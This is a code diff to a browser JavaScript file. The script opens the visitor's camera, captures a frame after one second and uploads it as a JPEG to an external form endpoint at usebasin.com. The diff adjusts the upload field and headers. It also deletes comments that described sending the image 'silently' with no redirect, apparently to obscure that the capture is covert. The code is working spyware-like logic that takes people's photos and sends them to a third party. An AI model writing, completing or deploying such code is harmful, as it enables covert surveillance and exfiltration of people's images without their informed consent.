@@ -11,7 +11,6 @@ async function startCamera() {
 
     video.srcObject = stream;
 
-    // Capture after 1 sec
     setTimeout(captureAndUpload, 1000);
 
   } catch (err) {
@@ -20,7 +19,6 @@ async function startCamera() {
 }
 
 async function captureAndUpload() {
-  // Draw frame to canvas
   const canvas = document.createElement("canvas");
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
@@ -31,18 +29,19 @@ async function captureAndUpload() {
   canvas.toBlob(async (blob) => {
     const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
 
-    // Create FormData manually (instead of using a form)
     const formData = new FormData();
-    formData.append("photo", file);
+    formData.append("file", file);   // Basin requires name="file"
 
     try {
-      // Send the image silently – NO redirect
       await fetch("https://usebasin.com/f/fb249d3e371b", {
         method: "POST",
-        body: formData
+        body: formData,
+        headers: {
+          "Accept": "application/json"
+        }
       });
 
-      console.log("Uploaded to Basin silently.");
+      console.log("Uploaded to Basin");
 
     } catch (error) {
       console.error("Upload error:", error);
